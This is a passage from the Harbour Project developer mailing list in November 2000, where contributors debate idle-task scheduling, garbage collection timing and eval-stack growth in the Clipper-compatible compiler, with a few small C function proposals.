> executing for the
> remainder of every Wait Session.
>
>    /* Maurilio, Ryszard, Victor, could you please review and comment... */


From harbour@lists.harbour-project.org  Thu Nov 23 13:22:02 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Thu Nov 23 13:22:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas   <ron@profit-master.com>
References: <3A1D6832.31467.507B8B7@localhost>
Message-ID: <040f01c0557a$61aa84b0$0a0ac8c8@VECWS1>

Maurilio and all,

>   Again - no. See comp.lang.clipper or any newsgroups archives to see 
> that all complains are related to running Clipper on Windows NT/2000. 
> Windows 3.x and 9x are not affected by this issue. It is just a 
> Microsoft magic :)

The difference between preemptive and cooperative (?) multitasking is that 
in the former the OS kernel guarantees that every running process will actually 
run, no one of them can completely block the others, and the switching will be 
fully OS controlled. The latter is a simple method where each process manually 
passes the opportunity to the next process manually.

So preemptive will not mean that every process will use the exact same amount 
of CPU time, the CPU time will depend on the priority of the process (this is 
the same for all user apps by default, at least on WinNT), and will depend on the 
actual code running in the processes. That means that preemptive multitasking 
will not (and don't want to) make a complete equality between the time slices.

Note that there was a very simple (basically one-liner) .C user program (*) which 
could completely hog WinNT 4.0, so that only switching off the computer 
could help. This was fixed in some Service Packs back then.

The conclusion is that every applications designed to run under multitasking 
OSs (whatever type of), _have to_ pay some attention to the other processes. 

(*) You can find it at www.sysinternals.com

Victor Szakats



From harbour@lists.harbour-project.org  Thu Nov 23 13:22:18 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 23 13:22:18 2000
Subject: [Harbour] Random gpfs
Message-ID: <200011231321_MC2-BBEA-E018@compuserve.com>

Ryszard,

"  I am thinking about a linked list of stack blocks instead of a =

linked list of single items. This will give a possibility to safe =

stack growth and at the same time will not decrease accessing speed =

significantly."

Use a _big_ block by default, and maybe it can be nearly as fast as
the current?

Not that _speed_ is the thing to worry too much about until we have
just about everything working. :-)  In case that gets anyone started,
please don't. :-) :-)  Right now I'd be _so_ happy to get Harbour to
build and get the OOP problem fixed...

John.

From harbour@lists.harbour-project.org  Thu Nov 23 13:22:39 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 23 13:22:39 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
Message-ID: <200011231321_MC2-BBEA-E014@compuserve.com>

Ryszard,

"Calling hb_releaseCPU() during idle states ..."

Looks fine - for some OSes it can immediately return. :-)

John.

From harbour@lists.harbour-project.org  Thu Nov 23 13:23:00 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 23 13:23:00 2000
Subject: [Harbour] Alaska's site
Message-ID: <200011231321_MC2-BBEA-E016@compuserve.com>

[To Dave Pearson]

"I don't know what's more perplexing, that KLOCs would be seen as a measu=
re
of anything or that they've got a compiler that's 1/5 the size of a whole=

operating system."

Agreed!  Truly awful (both of them).

Next they'll be saying how many "man months" (*) it took. :-(

(*) anyone puzzled: get and _read_ Fred Brooks' book NOW.  Please.
Should be required reading especially for all managers involved with
s/w projects. :-)

John.

From harbour@lists.harbour-project.org  Thu Nov 23 13:23:19 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 23 13:23:19 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
Message-ID: <200011231321_MC2-BBEA-E013@compuserve.com>

Ryszard,

"A linked list ...  We cannot use any longer a simple hb_stack.pPos-1
and hb_stack.pBase+1."

Maybe we could make those sorts of things work.  Most of Harbour
will just access the most recent set of params, so those accesses
should be made simple and fast if possible.  (Yes, I did just post a
msg saying not to worry much about speed. <g>)  If a new stack block
is only alloc'ed in a few central pcodes (func/proc call & msg send),
and only when there isn't plenty of space left, then surely most of
Harbour can go on using the kinds of things above.  Also, freeing a
stack block could only be necessary at a few pcodes (return, any
others?).

Parts of Harbour which access multiple levels of the stack (PROCNAME
etc) would need bigger changes, but they're the only ones - I think.

"Additionally a codeblock will store a name and line number of =

function where it is created so we can report correctly ..."

:-)

John.

From harbour@lists.harbour-project.org  Thu Nov 23 13:25:04 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 13:25:04 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
In-Reply-To: <040e01c05578$ae7b0c30$0a0ac8c8@VECWS1>
Message-ID: <LOBBKAFMMFGJIKLMEPAKAEGADHAA.ron@profit-master.com>

Maurilio, Victor, Ryszard,

I'll second Maurilio's proposal, that taking advantage of a Virtual Address
Block Reserve is the most efficient approach! Probably the easiest to
implement too! :-)

If Win32 does offer such service (I will search too), we should not be that
concerned with 16bit DOS, as we already have more serious problems there
(most of which will just get worse, the larger the stack gets).

There are many, many, O/S dependant components in Harbour. We should *not*
shy away from O/S dependant solutions, when they are clearly superior to
other approaches.

I suspect that more and more O/S offer/will offer, such service anyway.

Ron

> Maurilio,
>
> > I think we should investigate memory allocation and commitment under
> > win32 (linux and OS/2 are surely ok and I can't belive that there isn't
> > something similar under win32 as well).
>
> The problem with this approach is that it's highly OS, platform and API
> dependent, but the real problem is that some OSs won't support such
> services at all (16bit DOS, handheld, embedded OSs), or at best in a
> linker or 3rd party specific way.
>
> So I think that either a fixed stack (using a user defined stack
> size with
> a reasonable default size), or the linked list is the way to go.
>
> The first choice is simpler and faster, while second scales much better.
> Linked blocks (if not too complicated to implement) could be a good
> balance between the two methods.
>
> Victor Szakats


From harbour@lists.harbour-project.org  Thu Nov 23 13:28:02 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 23 13:28:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKMEFODHAA.ron@profit-master.com>
References: <3A1D6832.31467.507B8B7@localhost>
Message-ID: <3A1D70B3.1123.528F1A4@localhost>

On 23 Nov 2000, at 10:08, Ron Pinkas wrote:

> 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
>    * source/rtl/idle.c
>    * source/rtl/inkey.c
>      ! Improved granularity of Idle Processing:
>          - GC is called only once per Wait Session.

  This means that any garbage created inside an idle task will be not 
collected immediately.

>     - Single Idle Task is performed for each iteration of
>     hb_idleState() but
> never more than once per Wait Session.

  Does this means that if someone will call INKEY(10) then the 
backgroud tasks will be called only once per ten seconds? Very bed 
move. Both the garbage collector and idle tasks will be not called 
any more if harbour level HB_IDLESTATE() will be used only and there 
will be no calls for INKEY().

>     - ReleaseCPU() is guaranteed to be the only code executing for the
> remainder of every Wait Session.
> 
>    /* Maurilio, Ryszard, Victor, could you please review and
>    comment... */

  This idle thread is starting to go nowhere... unneeded code changes 
in the middle of discussion, unnecessary complication of very simple 
logic, etc. Is it the future of harbour development?

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 23 13:28:24 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 13:28:24 2000
Subject: [Harbour] CHANGELOG: 2000-11-23 13:32 GMT+1
References: <3A1D659F.15494.4FDAC1C@localhost>
Message-ID: <3A1D6150.9A62F11E@libero.it>

Ryszard,

if you have data waiting on a serial buffer I think you're better
getting them instead of giving away your time slice. 

And note that as soon as your idle task calls an rdd to do I/O it could
(and most probably will) block somewhere inside your operating system
waiting for that I/O to complete and while it waits this completion it
will surely be preempted by your OS which will switch to any other
thread waiting to run (and if this other thread is of higher priority
(say an MP3 player) then your harbour thread could receive next cpu
slice _seconds_ later).

Don't use DOS as an example for your comparisons, it's an enterely
different matter.

regards.

Ryszard Glab ha scritto:
> 
> On 23 Nov 2000, at 18:17, Maurilio Longo wrote:
> 
> > When it returns from releaseCPU it leaves hb_IdleState() and goes back
> > to inkey.c where if it is waiting for some time to elapse (or there
> > are no keys to handle) it will call hb_idleState() again which will
> > call GC, execute second idle task (if present or re-execute first) and
> > then call releaseCPU again  and so on.
> 
>   IMHO - no. Because during garbage collecting (or during any other
> idle task) the key can be pressed causing that hb_releaseCPU() will
> be never called. Notice that the idle task can be a time consuming
> operation - for example I have used this technique in Clipper for
> pooling data from six buffers filled by interrupt driven serial ports
> and next storing them in a database. In this case storing the data
> had the higher priority then responding to keystrokes - adding a few
> miliseconds for this will have no influence on user's interacition.
> 
> Regards, Ryszard
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 13:31:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 13:31:02 2000
Subject: [Harbour] Random gpfs
In-Reply-To: <200011231321_MC2-BBEA-E018@compuserve.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKKEGADHAA.ron@profit-master.com>

John,

> Not that _speed_ is the thing to worry too much about until we have
> just about everything working. :-)  In case that gets anyone started,
> please don't. :-) :-)  Right now I'd be _so_ happy to get Harbour to
> build and get the OOP problem fixed...

Enough of the suspense already ;-)

What is you OOP problem?

Ron

From harbour@lists.harbour-project.org  Thu Nov 23 13:38:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 13:38:01 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <040f01c0557a$61aa84b0$0a0ac8c8@VECWS1>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOEGADHAA.ron@profit-master.com>

Victor

> Note that there was a very simple (basically one-liner) .C user
> program (*) which
> could completely hog WinNT 4.0, so that only switching off the computer
> could help. This was fixed in some Service Packs back then.
>
> (*) You can find it at www.sysinternals.com
>
> Victor Szakats

Do you have exact link? I couldn't find it.

Any way, the ability of any task, to hog a Pre-Emptive O/S, is clearly an
O/S bug.

Generally speaking, Pre-Emptive O/S should be able to execute multiple
applications, each consisting of the following:

while( 1 );

Without any adverse effect on the O/S responsiveness.

Ron


From harbour@lists.harbour-project.org  Thu Nov 23 13:54:01 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 23 13:54:01 2000
Subject: [Harbour] getting old CVS snapshots
In-Reply-To: <200011231243_MC2-BBF3-5305@compuserve.com>
Message-ID: <3A1D76E4.5387.541210B@localhost>

On 23 Nov 2000, at 12:42, John Skelton wrote:

> I don't know exactly what is broken, or exactly when it happened,
> unfortunately.  A while ago I had _loads_ of Clip-4-Win apps working
> (apart from parts I've got stubs for), but then one of the 0.35X
> changes made the OOP stop working properly.  I think that was about 3
> weeks ago.  Jean and I have been trying to find what it is but he's

  Sorry, I cannot help here.

> Just after the problem first occurred I wasn't able to build Harbour
> at all (remember the changes to the RDD stuff with some casts where I
> couldn't even figure out what they should be?).

  It just reminded me to add a forward declaration to dbfcdx1.h. Some 
C++ compilers treats undeclared structures as class declaration. I 
have commited this change right now.

> rtl.lib(idle.obj) : error LNK2001: unresolved external symbol
> "?hb_inkeyNext@@YAHXZ (int  __cdecl hb_inkeyNext(void))"
> bin\vc\hbrun.exe : error LNK1120: 1 unresolved externals
> 
> The weird bit is that idle.c declares that it needs that function, and
> it's defined OK in inkey.c.  I can't see what the problem is!

  Please try to add 'extern' or remove declartion and include 
hbapigt.h instead. Anyway I think that idle.c should not call any 
function related to keyboard.

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 23 14:03:01 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 23 14:03:01 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
In-Reply-To: <200011231321_MC2-BBEA-E013@compuserve.com>
Message-ID: <3A1D7907.6256.5497B1E@localhost>

On 23 Nov 2000, at 13:20, John Skelton wrote:

> Maybe we could make those sorts of things work.  Most of Harbour
> will just access the most recent set of params, so those accesses
> should be made simple and fast if possible.  (Yes, I did just post a
> msg saying not to worry much about speed. <g>)  If a new stack block
> is only alloc'ed in a few central pcodes (func/proc call & msg send),
> and only when there isn't plenty of space left, then surely most of
> Harbour can go on using the kinds of things above.  Also, freeing a
> stack block could only be necessary at a few pcodes (return, any
> others?).

  I thought about it however it doesn't solve the problem. The 
function parameters are placed on the stack before the number of 
local variables is known. We will have to change generated pcodes to 
include such information together with the symbol but it again 
doesn't help a much because we will have to support more then one 
block for a single function because we need some additional space for 
temporary items used in operators code.
  I plan to keep one free block so crossing blocks' bonduary will be 
effective.

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 23 14:25:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 14:25:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A1D70B3.1123.528F1A4@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMEGCDHAA.ron@profit-master.com>

Ryszard,

> > 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
> >    * source/rtl/idle.c
> >    * source/rtl/inkey.c
> >      ! Improved granularity of Idle Processing:
> >          - GC is called only once per Wait Session.
>
>   This means that any garbage created inside an idle task will be not
> collected immediately.

And...? Do you think that an Idle Task should generate so much garbage that
*has* to be collected at that *same* Wait State? And you are the same
individual concerned with allowing other tasks to run?

> >     - Single Idle Task is performed for each iteration of
> >     hb_idleState() but
> > never more than once per Wait Session.
>
>   Does this means that if someone will call INKEY(10) then the
> background tasks will be called only once per ten seconds? Very bed
> move.

I think it makes perfect sense! If someone had such concern about *his* Idle
Tasks, surely he can instead decrease the Inkey() value, and call
HB_IDLESTATE() explicitly, as frequently as needed by *him*. We shouldn't
sacrifice overall performance of Harbour, and other competing O/S tasks for
such *maybe*.

Remember it only affects the individual that had to use HB_IDLEADD()!!! Such
individual will have to know that Idle Tasks are only performed once per
Wait State, because it will be clearly documented!

> Both the garbage collector and idle tasks will be not called
> any more if harbour level HB_IDLESTATE() will be used only and there
> will be no calls for INKEY().

I just added the Reset Logic to HB_IDLESTATE() so the above is no longer
true.

> >     - ReleaseCPU() is guaranteed to be the only code executing for the
> > remainder of every Wait Session.
> >
> >    /* Maurilio, Ryszard, Victor, could you please review and
> >    comment... */
>
>   This idle thread is starting to go nowhere... unneeded code changes
> in the middle of discussion, unnecessary complication of very simple
> logic, etc. Is it the future of harbour development?

Is there any chance you will stop being so personal, and critical, of most
everything I contribute?

My recent change seem to have addressed all concerns raised, and was such a
small change, yet you treat it as if this was some monstrous change that
would be difficult to change.

Ron


From harbour@lists.harbour-project.org  Thu Nov 23 14:52:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 14:52:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKMEGCDHAA.ron@profit-master.com>
Message-ID: <3A1D7545.FA05A989@libero.it>

Ron, Ryszard,

> 
> > >     - Single Idle Task is performed for each iteration of
> > >     hb_idleState() but
> > > never more than once per Wait Session.
> >
> >   Does this means that if someone will call INKEY(10) then the
> > background tasks will be called only once per ten seconds? Very bed
> > move.
> 
> I think it makes perfect sense! If someone had such concern about *his* Idle
> Tasks, surely he can instead decrease the Inkey() value, and call
> HB_IDLESTATE() explicitly, as frequently as needed by *him*. We shouldn't
> sacrifice overall performance of Harbour, and other competing O/S tasks for
> such *maybe*.
> 

I don't like the idea that if I call inkey(0) my idle task will be
called only once (I'm rebuilding right now, so I'll make some test later
:-)).

I'd like idle tasks to be some "poor man threads" and so be called every
time hb_idleState is entered (one at a time).

I think that this should be changed.

regards.

PS. onidle.prg inside \tests\ should have a running time counter, I
can't test it right now, but I fear latest changes will make it stop
after first call.


-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 14:58:01 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Thu Nov 23 14:58:01 2000
Subject: [Harbour] Random gpfs
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKKEGADHAA.ron@profit-master.com>
References: <200011231321_MC2-BBEA-E018@compuserve.com>
Message-ID: <200011231957.UAA20969@pegasus.wanadoo.be>

Hi Ron

I'm aware of John's problem where some messages are not found 
where they should. Also I have all here to try to reproduce the 
problem... The only 'problem' was that I have to use VC++ wich 
was not anymore installed on my computer :-(. Now it's done, I will 
first try to compile Harbour itself ...

> John,
> 
> > Not that _speed_ is the thing to worry too much about until we have just
> > about everything working. :-)  In case that gets anyone started, please
> > don't. :-) :-)  Right now I'd be _so_ happy to get Harbour to build and
> > get the OOP problem fixed...
> 
> Enough of the suspense already ;-)
> 
> What is you OOP problem?
> 
> Ron
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Thu Nov 23 15:00:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 15:00:03 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKMEGCDHAA.ron@profit-master.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGEGDDHAA.ron@profit-master.com>

2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * source/rtl/idle.c
     ! Added Reset Logic to HB_IDLESTATE()

I would like to propose renaming HB_IDLESTATE() to HB_IDLE_STEP() and adding
a new HB_IDLE_ALL() (Victor?) which is the following:

HB_FUNC( HB_IDLE_ALL )
{

   if( s_pIdleTasks == NULL )
   {
     hb_idleState();
   }
   else
   {
     while( hb_vm_uiIdleTask < hb_vm_uiIdleMaxTask )
     {
       hb_idleState();
     }
   }

   hb_vm_uiIdleTask = 0;
   hb_vm_bCollectGarbage = TRUE;
}

Similarly we might have hb_idleState() renamed to hb_idleStep() and we might
have a low level hb_idleAll().

hb_idleAll() and HB_IDLE_ALL() should be discouraged in documentation.

Ron


From harbour@lists.harbour-project.org  Thu Nov 23 15:09:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 15:09:02 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKGEGDDHAA.ron@profit-master.com>
Message-ID: <3A1D792E.18D354@libero.it>

Ron,

I tried tests\onidle.prg with your last code. Running time counter is
blocked. I think you should revert to last code calling an idle task 
per hb_idleState() invocation.

We don't need to add a new set of functions; before your code onidle.prg
had a running counter without any noticeable cpu use (under OS/2 there
is a graph of cpu usage always visible).

As it is now idle task have no use at all. 

regards.


PS. You know you've reached perfection when there is nothing more to
remove, not when there is nothing more to add :-)


Ron Pinkas ha scritto:
> 
> 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
>    * source/rtl/idle.c
>      ! Added Reset Logic to HB_IDLESTATE()
> 
> I would like to propose renaming HB_IDLESTATE() to HB_IDLE_STEP() and adding
> a new HB_IDLE_ALL() (Victor?) which is the following:
> 
> HB_FUNC( HB_IDLE_ALL )
> {
> 
>    if( s_pIdleTasks == NULL )
>    {
>      hb_idleState();
>    }
>    else
>    {
>      while( hb_vm_uiIdleTask < hb_vm_uiIdleMaxTask )
>      {
>        hb_idleState();
>      }
>    }
> 
>    hb_vm_uiIdleTask = 0;
>    hb_vm_bCollectGarbage = TRUE;
> }
> 
> Similarly we might have hb_idleState() renamed to hb_idleStep() and we might
> have a low level hb_idleAll().
> 
> hb_idleAll() and HB_IDLE_ALL() should be discouraged in documentation.
> 
> Ron
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 15:18:02 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Thu Nov 23 15:18:02 2000
Subject: [Harbour] Alaska's site
In-Reply-To: <200011231321_MC2-BBEA-E016@compuserve.com>; from John_Skelton@compuserve.com on Thu, Nov 23, 2000 at 01:20:59PM -0500
References: <200011231321_MC2-BBEA-E016@compuserve.com>
Message-ID: <20001123201706.C26952@hagbard.davep.org>

On Thu, Nov 23, 2000 at 01:20:59PM -0500, John Skelton wrote:

> Next they'll be saying how many "man months" (*) it took. :-(
> 
> (*) anyone puzzled: get and _read_ Fred Brooks' book NOW. Please. Should
> be required reading especially for all managers involved with s/w
> projects. :-)

<URL:http://www.bookshop.co.uk/ser/serdsp.asp?shop=1&isbn=0201835959&DB=224>

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Thu Nov 23 15:19:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 15:19:03 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A1D7545.FA05A989@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGEGEDHAA.ron@profit-master.com>

Maurilio,

Isn't it better if *when* such need arise, the developer will *explicitly*
indicate such?

We can easily add hb_idleReset() and HB_IDLE_RESET(), so that at the end of
your Idle Tasks, you can explicitly request recurring processing, by
resetting at will!

Here is a [modified] example (from onidle.prg):

nH1 = HB_IDLEADD( {|| DEVPOS(0,01), DEVOUT( TIME() ), HB_IDLE_RESET()} )
                                                          ^^^

Here is what HB_IDLE_RESET() will look like:

// ------ //
HB_FUNC( HB_IDLE_RESET )
{
   if( hb_vm_uiIdleTask == hb_vm_uiIdleMaxTask )
   {
      hb_vm_uiIdleTask = 0;
      hb_vm_bCollectGarbage = TRUE;
   }
}
// ------ //

I don't think it is wise/efficient to force such redundant reoccurrence
unless explicitly requested.

This proposal will be far more O/S friendly and will still allow the
developer to force reoccurrence if needed.

Ron

> I don't like the idea that if I call inkey(0) my idle task will be
> called only once (I'm rebuilding right now, so I'll make some test later
> :-)).
>
> I'd like idle tasks to be some "poor man threads" and so be called every
> time hb_idleState is entered (one at a time).
>
> I think that this should be changed.
>
> regards.
>
> PS. onidle.prg inside \tests\ should have a running time counter, I
> can't test it right now, but I fear latest changes will make it stop
> after first call.


From harbour@lists.harbour-project.org  Thu Nov 23 15:28:01 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 15:28:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKMEGCDHAA.ron@profit-master.com> <3A1D7545.FA05A989@libero.it>
Message-ID: <3A1D7D8F.702D6E46@libero.it>

Ron, Ryszard,

I don't want to change my 

cChar := Inkey(0) 

with

while (cChar := Inkey(.1)) <> ""
	hb_IdleState()
enddo

its cumbersome.

Idle task should be a "fire and forget" thing. Start them and rest
assured that as soon as you have a long enough pause they will be
called.

regards.


Maurilio Longo ha scritto:
> 
> Ron, Ryszard,
> 
> >
> > > >     - Single Idle Task is performed for each iteration of
> > > >     hb_idleState() but
> > > > never more than once per Wait Session.
> > >
> > >   Does this means that if someone will call INKEY(10) then the
> > > background tasks will be called only once per ten seconds? Very bed
> > > move.
> >
> > I think it makes perfect sense! If someone had such concern about *his* Idle
> > Tasks, surely he can instead decrease the Inkey() value, and call
> > HB_IDLESTATE() explicitly, as frequently as needed by *him*. We shouldn't
> > sacrifice overall performance of Harbour, and other competing O/S tasks for
> > such *maybe*.
> >
> 
> I don't like the idea that if I call inkey(0) my idle task will be
> called only once (I'm rebuilding right now, so I'll make some test later
> :-)).
> 
> I'd like idle tasks to be some "poor man threads" and so be called every
> time hb_idleState is entered (one at a time).
> 
> I think that this should be changed.
> 
> regards.
> 
> PS. onidle.prg inside \tests\ should have a running time counter, I
> can't test it right now, but I fear latest changes will make it stop
> after first call.
> 
> --
> 
>  __________
> |  |  | |__| md2520@mclink.it
> |_|_|_|____| Team OS/2 Italia
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 15:28:31 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Thu Nov 23 15:28:31 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
References: <LOBBKAFMMFGJIKLMEPAKAEGADHAA.ron@profit-master.com>
Message-ID: <043a01c0558a$8db52280$0a0ac8c8@VECWS1>

Ron,

> I'll second Maurilio's proposal, that taking advantage of a Virtual Address
> Block Reserve is the most efficient approach! Probably the easiest to
> implement too! :-)
> 
> If Win32 does offer such service (I will search too), we should not be that
> concerned with 16bit DOS, as we already have more serious problems there
> (most of which will just get worse, the larger the stack gets).
> 
> There are many, many, O/S dependant components in Harbour. We should *not*
> shy away from O/S dependant solutions, when they are clearly superior to
> other approaches.
> 
> I suspect that more and more O/S offer/will offer, such service anyway.

100% disagree here, the OS dependent parts are well isolated, and they 
are mainly used in I/O features, adding a highly platform specific feature 
to the core of the kernel is a no-no for me. I very much doubt the 16bit 
DOS systems will ever offer such API as a standard.

As said several times, the fact that DOS support has some problems, 
doesn't mean that we should severe the situation by adding _new_ problems, 
or we could ignore the 16bit platform.

Victor Szakats



From harbour@lists.harbour-project.org  Thu Nov 23 15:33:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 15:33:01 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A1D792E.18D354@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEGFDHAA.ron@profit-master.com>

Maurilio,

> Ron,
>
> I tried tests\onidle.prg with your last code. Running time counter is
> blocked. I think you should revert to last code calling an idle task
> per hb_idleState() invocation.
>
> We don't need to add a new set of functions; before your code onidle.prg
> had a running counter without any noticeable cpu use (under OS/2 there
> is a graph of cpu usage always visible).
>
> As it is now idle task have no use at all.

The above is not necessarily correct. I don't think it is reasonable to
assume that an Idle Block *must* be reevaluated *repeatedly* per single Wait
State.

I *do* agree that it should be *allowed*, but I don't think this should be
the *default* behavior.

There might be many valid uses of such Idle Blocks where one invocation per
Wait State *is* the desired behavior, and we should allow it too. In fact I
think that should be the default.

> PS. You know you've reached perfection when there is nothing more to
> remove, not when there is nothing more to add :-)

Right, but we are not even close to perfection here, because, if I as a
developer didn't mean for my Idle Block to be repeatedly executed per Wait
State, I had no way of doing so.

Ron


From harbour@lists.harbour-project.org  Thu Nov 23 15:38:02 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Thu Nov 23 15:38:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas   <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKOEGADHAA.ron@profit-master.com>
Message-ID: <047001c0558d$26410940$0a0ac8c8@VECWS1>

Ron,

> Do you have exact link? I couldn't find it.
> 
> Any way, the ability of any task, to hog a Pre-Emptive O/S, is clearly an
> O/S bug.

It was a bug yes, but note that after the OS fix, the OS was still hogged.

I can't find it right now (it was several years ago), but I'll dig it up from my 
archives.

> Generally speaking, Pre-Emptive O/S should be able to execute multiple
> applications, each consisting of the following:
> 
> while( 1 );
> 
> Without any adverse effect on the O/S responsiveness.

It would, but would such an app allow the others to run at an acceptable 
speed ?

Victor Szakats



From harbour@lists.harbour-project.org  Thu Nov 23 15:38:32 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 15:38:32 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A1D7D8F.702D6E46@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGEGFDHAA.ron@profit-master.com>

Maurilio,

> Ron, Ryszard,
>
> I don't want to change my
>
> cChar := Inkey(0)
>
> with
>
> while (cChar := Inkey(.1)) <> ""
> 	hb_IdleState()
> enddo
>
> its cumbersome.

You don't have to! You can easily force reoccurrence by adding
HB_IDLE_RESET() to your Idle Block.

> Idle task should be a "fire and forget" thing. Start them and rest
> assured that as soon as you have a long enough pause they will be
> called.

What if the developer dose *not* want *his* Idle Block to be evaluated
repeatedly per Wait State? Don't you think it should be allowed? What do you
think should be the default?

Ron


From harbour@lists.harbour-project.org  Thu Nov 23 15:43:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 15:43:03 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
In-Reply-To: <043a01c0558a$8db52280$0a0ac8c8@VECWS1>
Message-ID: <LOBBKAFMMFGJIKLMEPAKAEGGDHAA.ron@profit-master.com>

Victor,

> As said several times, the fact that DOS support has some problems,
> doesn't mean that we should severe the situation by adding _new_
> problems,
> or we could ignore the 16bit platform.

I agree 100%!!!

Though, this proposal will not add any *new* problem to DOS. It will simply
